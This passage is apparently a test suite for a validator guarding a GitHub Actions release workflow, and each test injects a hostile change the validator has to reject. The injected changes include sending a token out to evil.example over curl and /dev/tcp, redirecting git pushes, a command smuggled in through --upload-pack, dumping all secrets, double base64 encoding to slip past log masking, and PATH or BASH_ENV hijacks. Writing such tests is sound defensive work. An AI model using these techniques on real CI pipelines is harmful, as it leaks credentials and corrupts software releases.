    it('a token for the whole account', () =>
        red((w) => {
            const mint = pushJob(w).steps?.find((s) => s.uses?.startsWith(MINT_ACTION))
            if (mint?.with) mint.with.owner = 'safeinsights'
        }, /sets `owner`/))
    it('no push at all, leaving contents: write unforced', () =>
        red((w) => {
            pushStep(w).run = 'echo "$TOKEN" | base64 -w0 >/dev/null\n'
        }, /grants contents, which nothing in release\.yml uses/))
    it('a backtick command', () =>
        red((w) => appendRun(w, 'echo `curl -H "Authorization: token $TOKEN" https://api.github.com/x`'), /backtick/))
    it('a process substitution', () =>
        red((w) => appendRun(w, 'echo <(curl -d "$TOKEN" https://evil.example)'), /process substitution/))
    it('a bash network redirect', () =>
        red((w) => appendRun(w, 'printf %s "$TOKEN" > /dev/tcp/evil.example/443'), /network redirect/))
    it('the token written to a file', () =>
        red((w) => appendRun(w, 'printf %s "$TOKEN" > "$RUNNER_TEMP/t"'), /redirects to \$RUNNER_TEMP\/t/))
    it('a git config that redirects the push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" config url.https://evil/.pushInsteadOf https://github.com/'),
            /unclassified git subcommand `git config`/,
        ))
    it('a GIT_CONFIG_* prefix', () =>
        red((w) => appendRun(w, 'GIT_CONFIG_COUNT=1 git -C "$pusher" rev-parse HEAD'), /sets GIT_CONFIG_COUNT/))
    it('a GIT_CONFIG_* in the step env', () =>
        red((w) => {
            const step = pushStep(w)
            step.env = { ...step.env, GIT_CONFIG_COUNT: '1' }
        }, /sets env GIT_CONFIG_COUNT/))
    it('BASH_ENV in the job env', () =>
        red((w) => {
            pushJob(w).env = { BASH_ENV: './evil.sh' }
        }, /job push sets BASH_ENV/))
    it('a step shell', () =>
        red((w) => {
            pushStep(w).shell = 'python'
        }, /sets shell: python/))
    it('a defaults.run.shell', () =>
        red((w) => {
            w.defaults = { run: { shell: 'bash -c "curl x; bash -e {0}"' } }
        }, /the workflow sets defaults/))
    it('set -a, which exports every later assignment', () =>
        red((w) => {
            const step = pushStep(w)
            step.run = `set -a\n${step.run}`
        }, /`set -a`/))
    it('a fetch from elsewhere into the push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" fetch -q "$GITHUB_WORKSPACE" "+other:refs/heads/release"'),
            /git fetch takes/,
        ))
    it('a fetch running a command', () =>
        red(
            (w) => appendRun(w, 'git fetch --upload-pack="curl x;git-upload-pack" "$GITHUB_WORKSPACE"'),
            /--upload-pack=curl x;git-upload-pack is not allowed/,
        ))
    it('git init with a template', () =>
        red((w) => appendRun(w, 'git init --template=/tmp/t "$pusher"'), /git init --template/))
    it('a push that runs hooks', () =>
        red((w) => {
            const step = pushStep(w)
            step.run = step.run?.replace('push --no-verify', 'push')
        }, /without --no-verify/))
    it('a toJSON(secrets) in the push job', () =>
        red((w) => {
            pushStep(w).env = { ...pushStep(w).env, ALL: '${{ toJSON(secrets) }}' }
        }, /reads secrets or variables/))
    it("the token read as steps['app-token']", () =>
        red((w) => {
            w.jobs.pack.steps?.push({ uses: 'x/y@v1', with: { t: "${{ steps['app-token'].outputs.token }}" } })
        }, /reads the steps context in a form/))
    it('a step after the token step', () =>
        red((w) => {
            pushJob(w).steps?.push({ run: 'true' })
        }, /is not the job's last step/))
    it('a widened trigger', () =>
        red((w) => {
            w.on = { ...(w.on as object), workflow_dispatch: {} }
        }, /triggers are/))
    it('a second job in the release environment', () =>
        red((w) => {
            w.jobs.pack.environment = { name: 'release' }
        }, /job pack runs in the "release" environment without minting/))
    it('a PATH prefix before git', () =>
        red((w) => appendRun(w, 'PATH="$GITHUB_WORKSPACE/bin:$PATH" git -C "$pusher" rev-parse HEAD'), /sets PATH/))
    it('an unlisted assignment', () => red((w) => appendRun(w, 'other=1'), /assigns other/))
    it('printf -v', () =>
        red((w) => appendRun(w, 'printf -v GIT_CONFIG_GLOBAL %s "$GITHUB_WORKSPACE/evil.cfg"'), /printf -v/))
    it('the token printed in a form the log mask misses', () =>
        red((w) => appendRun(w, 'printf %s "$TOKEN" | base64 -w0 | base64 -w0'), /reads \$TOKEN outside the one line/))
    it('a workflow command from the token step', () =>
        red((w) => appendRun(w, 'echo "::set-output name=t::$auth"'), /emits a workflow command/))
    it('a different commit pushed under the same refspec', () =>
        red((w) => {
            const step = pushStep(w)
            step.run = step.run?.replace('sha=$(git rev-parse HEAD)', 'sha=$(git rev-parse HEAD)\nsha=origin/x')
        }, /the push job changed/))
    it('a step before the mint that writes $GITHUB_ENV', () =>
        red((w) => {
            pushJob(w).steps?.splice(0, 0, { run: 'echo "GIT_CONFIG_COUNT=1" >> "$GITHUB_ENV"' })
        }, /the push job changed/))
    it('a container for the job', () =>
        red((w) => {
            pushJob(w).container = 'evil/image:latest'
        }, /the push job changed/))
    it('the mint action at a moving ref', () =>
        red((w) => {
            const mint = pushJob(w).steps?.find((s) => s.uses?.startsWith(MINT_ACTION))
            if (mint) mint.uses = `${MINT_ACTION}main`
        }, /the push job changed/))
    it('a workflow-level env', () =>
        red((w) => {
            w.env = { PATH: '/evil' }
        }, /workflow-level env/))
    it('a job in RELEASE, upper case, without the mint', () =>
        red((w) => {
            w.jobs.plan.environment = 'RELEASE'
        }, /job plan runs in the "release" environment without minting/))
    it('toJSON(SECRETS), upper case', () =>
        red((w) => {
            w.jobs.plan.steps?.push({ run: 'true', env: { K: '${{ toJSON(SECRETS) }}' } })
        }, /jobs\.plan\..*reads secrets or variables/))
    it('a second mint', () =>
        red((w) => {
            w.jobs.pack.steps?.push({ id: 'again', uses: `${MINT_ACTION}v3` })
        }, /exactly one .* step, found 2/))
})
